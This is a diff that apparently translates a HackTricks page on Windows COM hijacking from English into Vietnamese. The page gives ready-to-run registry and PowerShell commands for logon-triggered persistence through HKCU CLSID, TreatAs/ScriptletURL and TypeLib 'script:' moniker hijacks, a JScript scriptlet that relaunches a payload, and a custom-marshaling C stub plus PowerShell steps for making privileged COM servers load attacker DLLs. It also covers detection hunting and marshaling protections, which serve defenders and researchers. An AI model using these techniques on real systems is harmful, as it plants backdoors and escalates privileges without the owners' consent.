@@ -2,22 +2,22 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Searching non-existent COM components
+### Tìm kiếm các component COM không tồn tại
 
-As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistence mechanism**. Using `procmon` it's easy to find searched COM registries that don't exist yet and could be created by an attacker. Classic filters:
+Vì người dùng có thể sửa đổi các giá trị HKCU, **COM Hijacking** có thể được dùng làm **cơ chế persistence**. Dùng `procmon`, bạn có thể dễ dàng tìm các registry COM được truy vấn nhưng chưa tồn tại và kẻ tấn công có thể tạo chúng. Các bộ lọc cơ bản:
 
-- **RegOpenKey** operations.
-- where the _Result_ is **NAME NOT FOUND**.
-- and the _Path_ ends with **InprocServer32**.
+- Các thao tác **RegOpenKey**.
+- trong đó _Result_ là **NAME NOT FOUND**.
+- và _Path_ kết thúc bằng **InprocServer32**.
 
-Useful variations during hunting:
+Các biến thể hữu ích khi săn tìm:
 
-- Also look for missing **`LocalServer32`** keys. Some COM classes are out-of-process servers and will launch an attacker-controlled EXE instead of a DLL.
-- Search for **`TreatAs`** and **`ScriptletURL`** registry operations in addition to `InprocServer32`. Recent detection content and malware writeups keep calling these out because they are much rarer than normal COM registrations and therefore high-signal.
-- Copy the legitimate **`ThreadingModel`** from the original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` when cloning a registration into HKCU. Using the wrong model often breaks activation and makes the hijack noisy.<sup>[[3]](#references)</sup>
-- On 64-bit systems inspect both 64-bit and 32-bit views (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` and `HKLM\Software\Classes\WOW6432Node`) because 32-bit applications may resolve a different COM registration.
+- Tìm cả các key **`LocalServer32`** bị thiếu. Một số lớp COM là server chạy ngoài tiến trình và sẽ khởi chạy một EXE do kẻ tấn công kiểm soát thay vì một DLL.
+- Ngoài `InprocServer32`, tìm các thao tác registry **`TreatAs`** và **`ScriptletURL`**. Nội dung phát hiện gần đây và các bài phân tích malware liên tục nhắc đến những mục này vì chúng hiếm hơn nhiều so với các đăng ký COM thông thường, do đó có tín hiệu cao.
+- Khi sao chép một đăng ký vào HKCU, hãy dùng **`ThreadingModel`** hợp lệ từ `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Dùng sai model thường làm hỏng quá trình kích hoạt và khiến hành vi hijack dễ bị phát hiện.<sup>[[3]](#references)</sup>
+- Trên hệ thống 64-bit, hãy kiểm tra cả chế độ xem 64-bit và 32-bit (`procmon.exe` và `procmon64.exe`, `HKLM\Software\Classes` và `HKLM\Software\Classes\WOW6432Node`) vì ứng dụng 32-bit có thể phân giải sang một đăng ký COM khác.
 
-Once you have decided which non-existent COM to impersonate, execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._
+Sau khi quyết định sẽ giả mạo COM không tồn tại nào, hãy chạy các lệnh sau. _Hãy cẩn thận nếu bạn định giả mạo một COM được tải vài giây một lần, vì điều đó có thể là quá mức cần thiết._
 
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
@@ -25,9 +25,9 @@ New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
 
-### Hijackable Task Scheduler COM components
+### Các thành phần COM của Task Scheduler có thể bị hijack
 
-Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.
+Windows Tasks sử dụng Custom Triggers để gọi các đối tượng COM. Vì chúng được thực thi thông qua Task Scheduler, nên việc dự đoán thời điểm chúng được kích hoạt sẽ dễ dàng hơn.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -58,9 +58,9 @@ foreach ($Task in $Tasks)
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-Checking the output you can select one that is going to be executed **every time a user logs in** for example.
+Dựa trên kết quả, bạn có thể chọn một tác vụ sẽ được thực thi **mỗi khi người dùng đăng nhập**, chẳng hạn.
 
-Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU.
+Sau đó, tìm CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** trong **HKEY\CLASSES\ROOT\CLSID**, HKLM và HKCU. Thông thường, bạn sẽ thấy giá trị này không tồn tại trong HKCU.
 
 ```bash
 # Exists in HKCR\CLSID\
@@ -83,17 +83,17 @@ PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
 
-Then, you can just create the HKCU entry and every time the user logs in, your backdoor will be fired.
+Sau đó, bạn chỉ cần tạo mục HKCU và mỗi khi người dùng đăng nhập, backdoor của bạn sẽ được kích hoạt.
 
-## Dangling COM Registrations and Custom Marshaling
+## Đăng ký COM bị treo và Custom Marshaling
 
-A machine-wide COM registration can become a DLL-planting primitive without changing the registry. Look for an `InprocServer32` value whose DLL is absent and whose final path can be created or modified by a low-privileged user. Planting the exact DLL name makes any process that activates the CLSID load attacker code. In the CrossDevice example, the registered path was `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, so a standard user could create the missing child directory and DLL.<sup>[[5]](#references)</sup>
+Một đăng ký COM trên toàn máy có thể trở thành primitive DLL planting mà không cần thay đổi registry. Hãy tìm giá trị `InprocServer32` trỏ đến một DLL không tồn tại và có đường dẫn cuối cùng mà người dùng có quyền thấp có thể tạo hoặc sửa đổi. Đặt DLL đúng tên vào đó sẽ khiến mọi tiến trình kích hoạt CLSID tải mã của kẻ tấn công. Trong ví dụ CrossDevice, đường dẫn đã đăng ký là `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, vì vậy người dùng thông thường có thể tạo thư mục con và DLL còn thiếu.<sup>[[5]](#references)</sup>
 
-### `IMarshal` as a cross-process DLL-load primitive
+### `IMarshal` như một primitive tải DLL giữa các tiến trình
 
-COM normally represents an interface pointer with a standard `OBJREF` that refers the receiver back to the original object. An object that implements `IMarshal` can instead produce a custom `OBJREF`. Its `GetUnmarshalClass` method supplies the CLSID of the code that will reconstruct the object in the receiving process. That CLSID does not need to identify the original object. COM resolves it as an in-process server and loads the registered DLL before dispatching the requested interface method.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
+Thông thường, COM biểu diễn con trỏ interface bằng một `OBJREF` tiêu chuẩn, tham chiếu bên nhận về đối tượng gốc. Một đối tượng triển khai `IMarshal` có thể tạo ra một `OBJREF` tùy chỉnh. Phương thức `GetUnmarshalClass` cung cấp CLSID của mã sẽ tái tạo đối tượng trong tiến trình nhận. CLSID đó không cần xác định đối tượng gốc. COM phân giải nó thành một máy chủ trong tiến trình và tải DLL đã đăng ký trước khi chuyển tiếp lời gọi phương thức interface được yêu cầu.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
 
-A minimal malicious implementation only needs to substitute the dangling CLSID in `GetUnmarshalClass`.<sup>[[5]](#references)</sup>
+Một triển khai độc hại tối giản chỉ cần thay CLSID bị treo trong `GetUnmarshalClass`.<sup>[[5]](#references)</sup>
 
 ```c
 HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
@@ -104,20 +104,20 @@ HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
 }
 ```
 
-Send this object through a proxied method parameter such as an `[in] IUnknown *`. Another option is `CoGetInstanceFromIStorage`, with the custom-marshaled object also implementing enough of `IStorage` to pass the local checks. Automatic unmarshaling in the remote server resolves the substituted CLSID, so the DLL load occurs before the target method runs.<sup>[[5]](#references)</sup>
+Truyền đối tượng này qua một tham số của phương thức được proxy, chẳng hạn `[in] IUnknown *`. Một lựa chọn khác là `CoGetInstanceFromIStorage`, trong đó đối tượng được custom-marshaled cũng triển khai đủ `IStorage` để vượt qua các kiểm tra cục bộ. Quá trình unmarshaling tự động trong server từ xa sẽ phân giải CLSID đã bị thay thế, khiến DLL được nạp trước khi phương thức đích chạy.<sup>[[5]](#references)</sup>
 
-The primitive is not limited to missing registrations. It can also force the receiver to load an existing custom-unmarshaler DLL and expose bugs in its load or unmarshaling path.<sup>[[5]](#references)</sup>
+Primitive này không chỉ áp dụng cho các đăng ký bị thiếu. Nó cũng có thể buộc bên nhận nạp một DLL custom-unmarshaler hiện có và làm lộ các lỗi trong quá trình nạp hoặc unmarshaling của DLL đó.<sup>[[5]](#references)</sup>
 
-The chain needs all of the following conditions:<sup>[[5]](#references)</sup>
+Chuỗi khai thác cần tất cả các điều kiện sau:<sup>[[5]](#references)</sup>
 
-1. A machine-visible CLSID points to a missing or replaceable in-process DLL.
-2. The attacker can place that DLL at the resolved path.
-3. An activatable out-of-process COM server runs at the desired privilege level.
-4. The server accepts custom marshaling and exposes a proxied call that carries the attacker object across the process boundary.
+1. Một CLSID có thể được máy truy cập trỏ đến một DLL in-process bị thiếu hoặc có thể thay thế.
+2. Kẻ tấn công có thể đặt DLL đó vào đường dẫn được phân giải.
+3. Một COM server out-of-process có thể được kích hoạt và chạy ở mức đặc quyền mong muốn.
+4. Server chấp nhận custom marshaling và có một lời gọi được proxy để truyền đối tượng của kẻ tấn công qua ranh giới tiến trình.
 
-### Find dangling in-process servers
+### Tìm các in-process server có đăng ký bị treo
 
-[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) and [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) can enumerate the machine COM database and test each server through normal Win32 module resolution. This is preferable to `Test-Path` because some registrations contain only a filename and rely on the loader search path.<sup>[[5]](#references)</sup>
+[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) và [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) có thể liệt kê cơ sở dữ liệu COM của máy và kiểm tra từng server thông qua cơ chế phân giải module Win32 thông thường. Cách này tốt hơn `Test-Path` vì một số đăng ký chỉ chứa tên tệp và dựa vào đường dẫn tìm kiếm của loader.<sup>[[5]](#references)</sup>
 
 ```powershell
 function Test-ComServer($Server) {
@@ -132,13 +132,13 @@ $classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
     Sort-Object DefaultServer | Select-Object Name, DefaultServer
 ```
 
-Treat the result as a candidate list, not proof of exploitability. Resolve the path as the loader does, then inspect the DACL on the first existing parent and on the intended DLL if it already exists. A missing file is useful only when the attacker can create or replace the path that COM will actually resolve.<sup>[[5]](#references)</sup>
+Hãy xem kết quả là danh sách ứng viên, không phải bằng chứng có thể khai thác. Phân giải đường dẫn như loader thực hiện, sau đó kiểm tra DACL trên thư mục cha đầu tiên tồn tại và trên DLL dự kiến nếu DLL đó đã tồn tại. Tệp bị thiếu chỉ hữu ích khi attacker có thể tạo hoặc thay thế đường dẫn mà COM thực sự phân giải.<sup>[[5]](#references)</sup>
 
-### Select and start a privileged receiver
+### Chọn và khởi chạy tiến trình nhận có đặc quyền
 
-Inspect candidate COM classes for `RunAs`, service association, available interfaces, and RPC proxies. A class configured for `SYSTEM` but not backed by a named service might fail direct activation because RPCSS cannot start it. In that case, look for an unprivileged trigger that starts its host, such as an executable scheduled task, and reproduce any named-event or IPC prerequisite that keeps the server alive.<sup>[[5]](#references)</sup>
+Kiểm tra các lớp COM ứng viên để tìm `RunAs`, liên kết với dịch vụ, các interface khả dụng và RPC proxy. Một lớp được cấu hình chạy dưới quyền `SYSTEM` nhưng không được hỗ trợ bởi dịch vụ có tên có thể không kích hoạt trực tiếp được vì RPCSS không thể khởi chạy nó. Trong trường hợp đó, hãy tìm một trigger không có đặc quyền để khởi chạy host của nó, chẳng hạn như scheduled task có thể thực thi, và tái tạo mọi điều kiện tiên quyết về named event hoặc IPC giúp server tiếp tục chạy.<sup>[[5]](#references)</sup>
 
-For example, the vulnerable Shell Create Object Handler chain started its host by creating the expected global event before invoking a user-executable scheduled task.<sup>[[5]](#references)</sup>
+Ví dụ, chuỗi Shell Create Object Handler dễ bị tấn công đã khởi chạy host bằng cách tạo global event như mong đợi trước khi gọi scheduled task có thể thực thi bởi người dùng.<sup>[[5]](#references)</sup>
 
 ```powershell
 $ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
@@ -147,7 +147,7 @@ $ev.Wait()
 $object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
 ```
 
-Map the resulting object reference back to its host and verify both identity and marshaling policy. Then enumerate interfaces and convert their proxies to IDL to find an input parameter such as `IUnknown *` that will marshal the fake object.<sup>[[5]](#references)</sup>
+Ánh xạ object reference thu được trở lại host của nó và xác minh cả danh tính lẫn chính sách marshaling. Sau đó, liệt kê các interface và chuyển đổi proxy của chúng sang IDL để tìm một tham số đầu vào như `IUnknown *` có thể marshal fake object.<sup>[[5]](#references)</sup>
 
 ```powershell
 $objref = Get-ComObjRef -Object $object
@@ -158,23 +158,23 @@ Get-ComInterface -Object $object
 Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
 ```
 
-### Custom-marshaling protections
+### Bảo vệ custom marshaling
 
-A suitable receiver must not reject untrusted custom marshalers. Two process-wide protections are `EOAC_NO_CUSTOM_MARSHAL` in the capabilities passed to `CoInitializeSecurity` and `COMGLB_UNMARSHALING_POLICY_STRONG` set through `IGlobalOptions::Set`. With symbols, the corresponding state can be inspected in `combase!gCapabilities` and `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager exposes the result as `CustomMarshalAllowed` where its process parser supports the Windows build.<sup>[[5]](#references)</sup>
+Một bên nhận phù hợp không được từ chối các custom marshaler không đáng tin cậy. Có hai cơ chế bảo vệ trên toàn tiến trình: `EOAC_NO_CUSTOM_MARSHAL` trong các capability truyền cho `CoInitializeSecurity` và `COMGLB_UNMARSHALING_POLICY_STRONG` được thiết lập thông qua `IGlobalOptions::Set`. Khi có symbols, có thể kiểm tra trạng thái tương ứng trong `combase!gCapabilities` và `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager hiển thị kết quả dưới dạng `CustomMarshalAllowed` nếu trình phân tích tiến trình hỗ trợ bản dựng Windows đó.<sup>[[5]](#references)</sup>
 
 ---
 
 ## COM TreatAs Hijacking + ScriptletURL
 
-`TreatAs` allows one CLSID to be emulated by another one.<sup>[[4]](#references)</sup> From an offensive perspective this means you can leave the original CLSID untouched, create a second per-user CLSID that points to `scrobj.dll`, and then redirect the real COM object to the malicious one with `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.
+`TreatAs` cho phép một CLSID được mô phỏng bởi một CLSID khác.<sup>[[4]](#references)</sup> Từ góc độ tấn công, điều này có nghĩa là bạn có thể giữ nguyên CLSID gốc, tạo một CLSID per-user thứ hai trỏ đến `scrobj.dll`, rồi chuyển hướng đối tượng COM thực sang đối tượng độc hại bằng `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.
 
-This is useful when:
+Cách này hữu ích khi:
 
-- the target application already instantiates a stable CLSID at logon or on app start
-- you want a registry-only redirect instead of replacing the original `InprocServer32`
-- you want to execute a local or remote `.sct` scriptlet through the `ScriptletURL` value
+- ứng dụng mục tiêu đã khởi tạo một CLSID ổn định khi đăng nhập hoặc khi khởi động ứng dụng
+- bạn muốn chuyển hướng chỉ bằng registry thay vì thay thế `InprocServer32` gốc
+- bạn muốn thực thi một scriptlet `.sct` cục bộ hoặc từ xa thông qua giá trị `ScriptletURL`
 
-Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
+Quy trình ví dụ (được điều chỉnh từ tradecraft công khai của Atomic Red Team và các nghiên cứu cũ hơn về lạm dụng registry COM):
 
 ```cmd
 :: 1. Create a malicious per-user COM class backed by scrobj.dll
@@ -189,21 +189,21 @@ reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\Scri
 reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
 ```
 
-Notes:
+Ghi chú:
 
-- `scrobj.dll` reads the `ScriptletURL` value and executes the referenced `.sct`, so you can keep the payload as a local file or pull it remotely over HTTP/HTTPS.
-- `TreatAs` is especially handy when the original COM registration is complete and stable in HKLM, because you only need a small per-user redirect instead of mirroring the entire tree.
-- For validation without waiting on the natural trigger, you can instantiate the fake ProgID/CLSID manually with `rundll32.exe -sta <ProgID-or-CLSID>` if the target class supports STA activation.
+- `scrobj.dll` đọc giá trị `ScriptletURL` và thực thi `.sct` được tham chiếu, vì vậy bạn có thể lưu payload dưới dạng tệp cục bộ hoặc tải tệp từ xa qua HTTP/HTTPS.
+- `TreatAs` đặc biệt hữu ích khi đăng ký COM gốc đã đầy đủ và ổn định trong HKLM, vì bạn chỉ cần một redirect nhỏ cho từng người dùng thay vì sao chép toàn bộ cây khóa.
+- Để xác thực mà không cần chờ trigger tự nhiên, bạn có thể khởi tạo thủ công ProgID/CLSID giả bằng `rundll32.exe -sta <ProgID-or-CLSID>` nếu lớp đích hỗ trợ kích hoạt STA.
 
-## COM TypeLib Hijacking (script: moniker persistence)
+## COM TypeLib Hijacking (script: persistence bằng moniker)
 
-Type Libraries (TypeLib) define COM interfaces and are loaded via `LoadTypeLib()`. When a COM server is instantiated, the OS may also load the associated TypeLib by consulting registry keys under `HKCR\TypeLib\{LIBID}`. If the TypeLib path is replaced with a **moniker**, e.g. `script:C:\...\evil.sct`, Windows will execute the scriptlet when the TypeLib is resolved – yielding a stealthy persistence that triggers when common components are touched.
+Type Library (TypeLib) định nghĩa các giao diện COM và được tải thông qua `LoadTypeLib()`. Khi một COM server được khởi tạo, hệ điều hành cũng có thể tải TypeLib liên quan bằng cách tra cứu các khóa registry bên dưới `HKCR\TypeLib\{LIBID}`. Nếu đường dẫn TypeLib được thay bằng một **moniker**, chẳng hạn `script:C:\...\evil.sct`, Windows sẽ thực thi scriptlet khi phân giải TypeLib — tạo ra persistence kín đáo, được kích hoạt khi các thành phần phổ biến được sử dụng.
 
-This has been observed against the Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>
+Kỹ thuật này đã được quan sát thấy trên Microsoft Web Browser control (thường được Internet Explorer, các ứng dụng nhúng WebBrowser và thậm chí cả `explorer.exe` tải).<sup>[[1]](#references)[[2]](#references)</sup>
 
-### Steps (PowerShell)
+### Các bước (PowerShell)
 
-1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
+1) Xác định TypeLib (LIBID) được một CLSID có tần suất sử dụng cao dùng đến. Ví dụ về CLSID thường bị các chuỗi malware khai thác: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
@@ -212,7 +212,7 @@ $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
 
-2) Point the per-user TypeLib path to a local scriptlet using the `script:` moniker (no admin rights required):
+2) Trỏ đường dẫn TypeLib của người dùng đến một scriptlet cục bộ bằng moniker `script:` (không cần quyền admin):
 
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
@@ -220,7 +220,7 @@ New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force 
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
 
-3) Drop a minimal JScript `.sct` that relaunches your primary payload (e.g. a `.lnk` used by the initial chain):
+3) Thả một file JScript `.sct` tối giản để khởi chạy lại payload chính của bạn (ví dụ: một file `.lnk` được dùng trong chuỗi ban đầu):
 
 ```xml
 <?xml version="1.0"?>
@@ -239,9 +239,9 @@ Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32"
 </scriptlet>
 ```
 
-4) Triggering – opening IE, an application that embeds the WebBrowser control, or even routine Explorer activity will load the TypeLib and execute the scriptlet, re-arming your chain on logon/reboot.
+4) Kích hoạt – mở IE, một ứng dụng nhúng điều khiển WebBrowser, hoặc thậm chí hoạt động Explorer thông thường sẽ tải TypeLib và thực thi scriptlet, kích hoạt lại chuỗi khi đăng nhập/khởi động lại.
 
-Cleanup
+Dọn dẹp
 ```powershell
 # Remove the per-user TypeLib hijack
 Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
@@ -249,19 +249,18 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
 
-Notes
-- You can apply the same logic to other high-frequency COM components; always resolve the real `LIBID` from `HKCR\CLSID\{CLSID}\TypeLib` first.
-- On 64-bit systems you may also populate the `win64` subkey for 64-bit consumers.
+Ghi chú
+- Bạn có thể áp dụng logic tương tự cho các thành phần COM có tần suất sử dụng cao khác; luôn xác định `LIBID` thực tế trước tiên từ `HKCR\CLSID\{CLSID}\TypeLib`.
+- Trên hệ thống 64-bit, bạn cũng có thể tạo khóa con `win64` cho các ứng dụng 64-bit.
 
 ## References
 
-- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
-- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
-- [5] [Project Zero - Windows Exploitation Techniques: Dangling COM Object Registrations](https://projectzero.google/2026/09/windows-dangling-com.html)
-- [6] [Microsoft Learn - IMarshal interface](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
-- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
-
+- [1] [Chiếm quyền TypeLib – Kỹ thuật duy trì COM mới (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [2] [Check Point Research – Chiến dịch ZipLine: Cuộc tấn công lừa đảo tinh vi nhắm vào các công ty Hoa Kỳ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Xem xét lại việc chiếm quyền COM (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
+- [4] [Khóa CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
+- [5] [Project Zero - Kỹ thuật khai thác Windows: Đăng ký đối tượng COM bị treo](https://projectzero.google/2026/09/windows-dangling-com.html)
+- [6] [Microsoft Learn - Giao diện IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
+- [7] [Microsoft Open Specifications - OBJREF của MS-DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
 {{#include ../../banners/hacktricks-training.md}}
 
